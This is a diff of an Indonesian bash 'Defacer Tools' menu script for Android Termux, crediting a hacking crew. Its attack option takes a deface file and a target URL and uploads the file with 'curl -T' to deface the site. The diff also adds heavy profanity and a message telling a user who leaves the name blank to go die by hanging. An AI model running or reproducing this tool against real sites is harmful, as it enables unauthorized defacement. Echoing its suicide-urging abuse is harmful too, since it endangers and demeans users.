@@ -13,9 +13,41 @@ echo
 echo
 toilet -f future "    Defacer Tools" | lolcat
 echo
-echo $white "╭─"$yellow"WELLCOME TO MY TOOLS"$cyan" ~/Masukan Username Anda Di Bawah!!!"$white
+echo $white "╭─"$yellow"WELLCOME TO MY TOOLS"$cyan" ~/Masukan Nama/Nick Anda Di Bawah!!!"$white
 read -p " ╰─$ " kontol
+echo
+echo
+echo
+echo
+echo
+if [ $kontol =  ] || [ $kontol =  ]
+then
 clear
+echo
+echo
+echo
+echo
+echo
+echo $red"        Kan udah gue bilang isi dengan nama/nick lu njing!"
+sleep 1
+echo
+echo $red"               Ngeyel sih lu jadi orang bngsat!"
+sleep 2
+echo
+sleep 1
+echo $red"          Mending lu mati aja sonoh njing gantung diri"
+echo
+echo
+echo
+echo
+exit
+echo
+echo
+echo
+echo
+fi
+clear
+echo
 echo
 echo
 echo
@@ -44,11 +76,10 @@ echo
 echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$white"."$green"TUTORIAL & LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
 echo $red"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo $indigo"=============================================================="
-echo
 echo $white "╭─"$yellow"Chemod@zrd404"$cyan" ~/$kontol"$white
-read -p " ╰─$ "  apaan
+read -p " ╰─$ "  memek
 echo
-if [ $apaan = "01" ] || [ $apaan = "1" ]
+if [ $memek = "01" ] || [ $memek = "1" ]
 then
 echo
 echo
@@ -84,7 +115,7 @@ echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Kalo Mau Tebas Index Namai SC 
 read -p " ╰─$ " script
 echo
 echo
-echo $white"  Masukan Target 1 !!!!"
+echo $white"  Masukan Target !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Got Hacked!!!"$white
 read -p " ╰─$ " target
 curl -T /storage/emulated/0/$script $target
@@ -95,7 +126,7 @@ echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Qui
 read -p "[B/Q] : " back
 fi
 
-if [ $apaan = "02" ] || [ $apaan = "2" ]
+if [ $memek = "02" ] || [ $memek = "2" ]
 then
 echo
 echo
@@ -111,7 +142,7 @@ echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Qui
 read -p "[B/Q] : " back
 fi
 
-if [ $apaan = "03" ] || [ $apaan = "3" ]
+if [ $memek = "03" ] || [ $memek = "3" ]
 then
 clear
 echo
@@ -206,7 +237,7 @@ fi
 
 
 
-if [ $apaan = "04" ] || [ $apaan = "4" ]
+if [ $memek = "04" ] || [ $memek = "4" ]
 then
 echo
 echo
@@ -224,7 +255,7 @@ fi
 
 
 
-if [ $apaan = "05" ] || [ $apaan = "5" ]
+if [ $memek = "05" ] || [ $memek = "5" ]
 then
 clear
 echo
@@ -249,7 +280,7 @@ fi
 
 
 
-if [ $apaan = "I" ] || [ $apaan = "i" ]
+if [ $memek = "I" ] || [ $memek = "i" ]
 then
 echo
 echo
@@ -270,6 +301,14 @@ echo
 echo $cyan"[+] MR.NAGON_TA7 & KOKO "
 echo $cyan"[+] MR.W3B_XIT "
 echo $cyan"[+] MR.L3RBI & All Member [I.C.A] "
+echo
+echo $red   "                     THANKS TO MY FRIEND:"
+echo
+echo $cyan"[+] 0MEST"
+echo $cyan"[+] DakoChan"
+echo $cyan"[+] Ro0T_N3T"
+echo $cyan"[+] MR.B4H4"
+echo
 echo $red"##########################$green" WELCOME "$red###########################"
 echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo
@@ -277,7 +316,7 @@ echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Qui
 read -p "[B/Q] " back
 fi
 
-if [ $apaan = "T" ] || [ $apaan = "t" ]
+if [ $memek = "T" ] || [ $memek = "t" ]
 then
 cat tutorial.txt
 echo
